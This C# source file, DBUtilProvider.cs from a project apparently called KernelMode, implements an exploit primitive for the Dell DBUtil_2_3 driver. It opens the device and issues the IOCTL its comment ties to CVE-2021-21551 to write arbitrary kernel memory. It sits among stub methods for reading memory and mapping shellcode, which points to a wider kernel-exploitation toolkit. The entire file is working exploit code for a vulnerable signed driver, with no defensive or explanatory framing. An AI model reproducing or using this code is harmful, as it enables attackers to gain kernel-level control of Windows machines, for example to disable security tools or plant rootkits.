// File: Providers/DBUtilProvider.cs
// Project: KernelMode

using System;
using System.Runtime.InteropServices;
using Microsoft.Win32.SafeHandles;
using KernelMode.Providers;
using KernelMode.Utils;

namespace KernelMode.Providers
{
	public class DBUtilProvider : IProvider
	{
		private const string DeviceName = "\\\\.\\DBUtil_2_3";
		private const uint IOCTL_ARBITRARY_WRITE = 0x9B0C1EC4; // CVE-2021-21551 arbitrary write

		private SafeFileHandle _handle;
		public bool IsInitialized { get; private set; }

		[StructLayout(LayoutKind.Sequential)]
		private struct MEMMOVE_REQUEST
		{
			public ulong Destination;
			public ulong Source;
			public ulong Size;
		}

		public bool Initialize()
		{
			_handle = NativeMethods.CreateFile(DeviceName,
				NativeMethods.GENERIC_READ | NativeMethods.GENERIC_WRITE,
				0, IntPtr.Zero, NativeMethods.OPEN_EXISTING,
				0, IntPtr.Zero);

			IsInitialized = !_handle.IsInvalid && !_handle.IsClosed;
			return IsInitialized;
		}

		public bool ReadMemory(ulong address, byte[] buffer, int size)
		{
			Console.WriteLine("[-] DBUtilProvider does not support read natively.");
			return false;
		}

		public bool WriteMemory(ulong address, byte[] buffer, int size)
		{
			if (!IsInitialized) return false;

			IntPtr src = Marshal.AllocHGlobal(size);
			Marshal.Copy(buffer, 0, src, size);

			var request = new MEMMOVE_REQUEST
			{
				Destination = address,
				Source = (ulong)src.ToInt64(),
				Size = (ulong)size
			};

			IntPtr reqPtr = Marshal.AllocHGlobal(Marshal.SizeOf(typeof(MEMMOVE_REQUEST)));
			Marshal.StructureToPtr(request, reqPtr, false);

			int bytesReturned;
			bool result = NativeMethods.DeviceIoControl(
				_handle,
				IOCTL_ARBITRARY_WRITE,
				reqPtr,
				Marshal.SizeOf(typeof(MEMMOVE_REQUEST)),
				IntPtr.Zero,
				0,
				out bytesReturned,
				IntPtr.Zero);

			Marshal.FreeHGlobal(src);
			Marshal.FreeHGlobal(reqPtr);
			return result;
		}


		public bool MapShellcode(byte[] shellcode, ulong param)
		{
			Console.WriteLine("[-] DBUtilProvider does not support direct shellcode mapping.");
			return false;
		}

		public void Dispose()
		{
			_handle?.Dispose();
		}
	}
}
